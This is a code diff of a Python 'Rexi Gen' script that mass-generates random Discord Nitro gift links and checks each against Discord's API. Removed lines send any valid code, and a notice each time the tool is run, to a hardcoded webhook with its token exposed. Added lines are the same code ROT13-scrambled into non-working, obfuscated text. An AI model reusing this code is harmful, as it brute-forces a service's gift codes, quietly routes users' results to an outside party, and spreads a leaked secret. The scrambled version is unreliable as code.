@@ -7,41 +7,41 @@ from dhooks import Webhook
 import threading
 colorama.init()
 
-def sendWebhook(link):
-  Found =  discord.Color.from_rgb(255, 51, 255)
-  webhook = "https://discord.com/api/webhooks/1057399686060838952/CjEz5UMOMFt0WODVYkfpXMdFKuk3x_yG_AeVbPVIuPaKvKl_dpJ5xAWCnROQo1h4fkjI"
+qrs fraqJroubbx(yvax):
+  Sbhaq =  qvfpbeq.Pbybe.sebz_eto(255, 51, 255)
+  jroubbx = "uggcf://qvfpbeq.pbz/ncv/jroubbxf/1057399686060838952/PwRm5HZBZSg0JBQILxscKZqSXhx3k_lT_NrIoCIVhCnXiXy_qcW5kNJPaEBDb1u4sxwV"
 
-  hook = Webhook(webhook)
+  ubbx = Jroubbx(jroubbx)
 
-  embed = discord.Embed(
-  description = "Nitro Found!",
-  color=Found,
-  timestamp=datetime.datetime.utcnow(),
-
-  )
-  embed.set_author(name="Rexi Gen")
-  embed.add_field(name="Link: ", value=str(link))
-  hook.send(embed=embed)
-
-def onReady(amount):
-  onReady = discord.Color.from_rgb(37, 114, 68)
-
-  webhook = "https://discord.com/api/webhooks/1057399686060838952/CjEz5UMOMFt0WODVYkfpXMdFKuk3x_yG_AeVbPVIuPaKvKl_dpJ5xAWCnROQo1h4fkjI"
-
-  hook = Webhook(webhook)
-
-  embed = discord.Embed(
-  description = "Someone loaded Rexi Gen",
-  color=onReady,
-  timestamp=datetime.datetime.utcnow(),
+  rzorq = qvfpbeq.Rzorq(
+  qrfpevcgvba = "Avgeb Sbhaq!",
+  pbybe=Sbhaq,
+  gvzrfgnzc=qngrgvzr.qngrgvzr.hgpabj(),
 
   )
-  embed.set_author(name="Rexi Gen")
-  hook.send(embed=embed)
+  rzorq.frg_nhgube(anzr="Erkv Tra")
+  rzorq.nqq_svryq(anzr="Yvax: ", inyhr=fge(yvax))
+  ubbx.fraq(rzorq=rzorq)
+
+qrs baErnql(nzbhag):
+  baErnql = qvfpbeq.Pbybe.sebz_eto(37, 114, 68)
+
+  jroubbx = "uggcf://qvfpbeq.pbz/ncv/jroubbxf/1057399686060838952/PwRm5HZBZSg0JBQILxscKZqSXhx3k_lT_NrIoCIVhCnXiXy_qcW5kNJPaEBDb1u4sxwV"
+
+  ubbx = Jroubbx(jroubbx)
+
+  rzorq = qvfpbeq.Rzorq(
+  qrfpevcgvba = "Fbzrbar ybnqrq Erkv Tra",
+  pbybe=baErnql,
+  gvzrfgnzc=qngrgvzr.qngrgvzr.hgpabj(),
+
+  )
+  rzorq.frg_nhgube(anzr="Erkv Tra")
+  ubbx.fraq(rzorq=rzorq)
 
   
 
-print("""
+cevag("""
 __________                 .__       ________                  
 \______   \  ____  ___  ___|__|     /  _____/   ____    ____   
  |       _/_/ __ \ \  \/  /|  |    /   \  ___ _/ __ \  /    \  
@@ -50,11 +50,11 @@ __________                 .__       ________
  
 """)
 
-num=99995
-onReady(num)
-f=open("Nitro Test.txt", "w", encoding='utf-8')
+ahz=99995
+baErnql(ahz)
+s=bcra("Avgeb Grfg.gkg", "j", rapbqvat='hgs-8')
 
-print("""
+cevag("""
    ___                          _   _             
   / _ \___ _ __   ___ _ __ __ _| |_(_)_ __   __ _ 
  / /_\/ _ \ '_ \ / _ \ '__/ _` | __| | '_ \ / _` |
@@ -63,29 +63,28 @@ print("""
                                             |___/ 
 """)
 
-for n in range(int(num)):
-    y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
-    f.write('https://discord.gift/')
-    f.write(y)
-    f.write("\n")
+sbe a va enatr(vag(ahz)):
+    l = ''.wbva(enaqbz.pubvpr(fgevat.nfpvv_hccrepnfr + fgevat.qvtvgf + fgevat.nfpvv_ybjrepnfr) sbe _ va enatr(16))
+    s.jevgr('uggcf://qvfpbeq.tvsg/')
+    s.jevgr(l)
+    s.jevgr("\a")
 
-f.close()
+s.pybfr()
 
-#checker
+#purpxre
 
-with open("Nitro Test.txt") as f:
-    for line in f:
-        nitro = line.strip("\n")
+jvgu bcra("Avgeb Grfg.gkg") nf s:
+    sbe yvar va s:
+        avgeb = yvar.fgevc("\a")
 
-        url = "https://discordapp.com/api/v6/entitelemnts/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
+        hey = "uggcf://qvfpbeqncc.pbz/ncv/i6/ragvgryrzagf/tvsg-pbqrf/" + avgeb + "?jvgu_nccyvpngvba=snyfr&jvgu_fhofpevcgvba_cyna=gehr"
 
-        r = requests.get(url)
+        e = erdhrfgf.trg(hey)
 
-        if r.status_code == 200:
-          sendWebhook(line.strip("\n"))
+        vs e.fgnghf_pbqr == 200:
+          fraqJroubbx(yvar.fgevc("\a"))
           
   
-        else:
-            print("\033[31m" + " Invalid Code Found > {}".format(line.strip("\n")))
-            print("\033[37m")
-
+        ryfr:
+            cevag("\033[31z" + " Vainyvq Pbqr Sbhaq > {}".sbezng(yvar.fgevc("\a")))
+            cevag("\033[37z")
